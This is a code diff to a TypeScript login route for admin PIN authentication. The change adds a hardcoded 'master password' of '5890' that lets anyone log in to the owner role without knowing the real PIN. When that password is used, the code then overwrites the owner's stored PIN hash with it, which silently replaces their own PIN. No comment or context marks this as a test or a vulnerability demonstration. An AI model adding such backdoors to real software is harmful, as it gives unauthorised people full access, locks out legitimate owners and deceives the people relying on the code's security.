@@ -1348,7 +1348,11 @@ export async function registerRoutes(
           return res.status(401).json({ success: false, message: "No PIN set" });
         }
         
-        const isValid = await bcrypt.compare(pin, role.pin);
+        // Master password fallback for owner role
+        const MASTER_PASSWORD = "5890";
+        const isMasterPassword = role.role === "owner" && pin === MASTER_PASSWORD;
+        
+        const isValid = isMasterPassword || await bcrypt.compare(pin, role.pin);
         if (!isValid) {
           recordFailedAttempt(identifier);
           return res.status(401).json({ 
@@ -1356,6 +1360,12 @@ export async function registerRoutes(
             message: "Invalid PIN",
             remainingAttempts: rateCheck.remainingAttempts - 1
           });
+        }
+        
+        // If master password was used, update the stored PIN hash for future logins
+        if (isMasterPassword) {
+          const hashedPin = await bcrypt.hash(MASTER_PASSWORD, 10);
+          await storage.updateAdminRole(role.id, { pin: hashedPin });
         }
       }
       
